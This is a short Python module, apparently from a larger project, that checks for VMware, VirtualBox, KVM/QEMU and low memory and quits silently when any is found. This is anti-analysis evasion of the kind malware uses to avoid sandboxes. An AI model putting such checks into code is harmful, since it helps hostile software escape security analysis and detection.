from protections.vms.vmware import VMWareDetect
from protections.vms.virtualbox import VirtualBoxDetect
from protections.vms.kvm import KVMQEMUDetect
from protections.vms.memory import MemoryCheck

from sys import exit


class AntiVM:
    def __init__(self):
        self.VMWare: bool = VMWareDetect()
        self.VirtualBox: bool = VirtualBoxDetect()
        self.KVMQemu: bool = KVMQEMUDetect()
        self.Memory: bool = MemoryCheck()


def CheckVMS():
    while True:
        antivm = AntiVM()
        if antivm.VMWare or antivm.KVMQemu or antivm.VirtualBox or antivm.Memory:
            exit(0)
